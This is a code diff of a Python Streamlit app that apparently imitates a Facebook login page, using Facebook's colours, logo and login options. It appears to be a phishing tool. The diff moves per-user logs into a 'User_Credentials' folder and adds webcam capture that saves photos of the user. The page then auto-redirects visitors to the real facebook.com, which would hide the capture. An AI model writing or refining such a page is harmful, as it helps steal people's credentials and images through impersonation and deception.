@@ -13,7 +13,7 @@ if not os.path.exists("User_Images"):
 
 
 def configure_user_logger(username):
-    user_log_file = f"{username}.log"
+    user_log_file = os.path.join("User_Credentials", f"{username}.log")
     user_logger = logging.getLogger(username)
     user_logger.setLevel(logging.INFO)
 
@@ -36,10 +36,11 @@ def save_images(username):
     if not os.path.exists(user_folder):
         os.makedirs(user_folder)
 
+    st.info("Checking camera access...")
     cap = cv2.VideoCapture(0)
 
     if not cap.isOpened():
-        st.error("Could not access the camera.")
+        st.error("Could not access the camera. Please grant permissions and try again.")
         return
 
     ret, frame = cap.read()
@@ -55,27 +56,22 @@ def save_images(username):
     img_path = os.path.join(user_folder, f"{username}_{image_number}.jpg")
     cv2.imwrite(img_path, frame)
     cap.release()
+    st.success("Image saved successfully!")
 
 
 def redirect_to_facebook():
-    # Immediate JavaScript execution for automatic redirect
     js = """
         <script>
-            // Execute immediately when the script loads
             (function() {
-                // Open Facebook in new tab
                 window.open('https://www.facebook.com', '_blank');
             })();
         </script>
         <a href="https://www.facebook.com" target="_blank" id="fallbackLink" style="display: none;">Redirect to Facebook</a>
         <script>
-            // Fallback: Click the link automatically if the window.open fails
             document.getElementById('fallbackLink').click();
         </script>
     """
     components.html(js, height=0)
-
-    # Show a message with a manual link as final fallback
     st.markdown(
         """
         <div style="text-align: center; margin-top: 10px;">
@@ -87,7 +83,6 @@ def redirect_to_facebook():
     )
 
 
-# Enhanced UI Styling with responsive design
 st.markdown(
     """
     <style>
@@ -95,14 +90,8 @@ st.markdown(
         background-color: #f0f2f5;
     }
     .block-container {
-        max-width: 100% !important;
-        padding: 20px !important;
-    }
-    @media (min-width: 768px) {
-        .block-container {
-            max-width: 400px !important;
-            margin: auto !important;
-        }
+        max-width: 400px !important;
+        margin: auto !important;
     }
     .stButton>button {
         background-color: #1877f2;
@@ -111,36 +100,20 @@ st.markdown(
         padding: 8px 16px;
         border: none;
         border-radius: 4px;
-        margin: 5px;
         width: 100%;
-        max-width: 300px;
     }
     .stButton>button:hover {
         background-color: #145db2;
     }
     .logo img {
         width: 30%;
-        max-width: 150px;
         height: auto;
-    }
-    .stRadio > label {
-        font-size: 14px;
-    }
-    input {
-        max-width: 300px;
-        margin: auto !important;
-    }
-    @media (max-width: 768px) {
-        .stRadio [role="radiogroup"] {
-            flex-direction: column !important;
-        }
     }
     </style>
     """,
     unsafe_allow_html=True,
 )
 
-# Logo
 st.markdown(
     """
     <div class="logo" style="text-align: center;">
@@ -149,28 +122,6 @@ st.markdown(
     </div>
     """,
     unsafe_allow_html=True,
-)
-
-
-# Set default auth option based on device
-def is_mobile():
-    return st.session_state.get(
-        "is_mobile", st.query_params.get("platform", ["desktop"])[0] == "mobile"
-    )
-
-
-if "is_mobile" not in st.session_state:
-    st.session_state.is_mobile = is_mobile()
-
-default_option = "Login with Gmail" if st.session_state.is_mobile else "Login"
-
-# Navigation with default option
-auth_option = st.radio(
-    "Choose an option",
-    ("Login", "Sign Up", "Login with Gmail"),
-    horizontal=not st.session_state.is_mobile,
-    index=["Login", "Sign Up", "Login with Gmail"].index(default_option),
-    key="auth_option",
 )
 
 
@@ -238,6 +189,13 @@ if "users" not in st.session_state:
     st.session_state["users"] = {}
 if "redirect_done" not in st.session_state:
     st.session_state["redirect_done"] = False
+
+# Dropdown for authentication options
+auth_option = st.selectbox(
+    "Choose an authentication method",
+    ("Login", "Sign Up", "Login with Gmail"),
+    key="auth_option",
+)
 
 # Main logic
 if st.session_state["current_user"] is None:
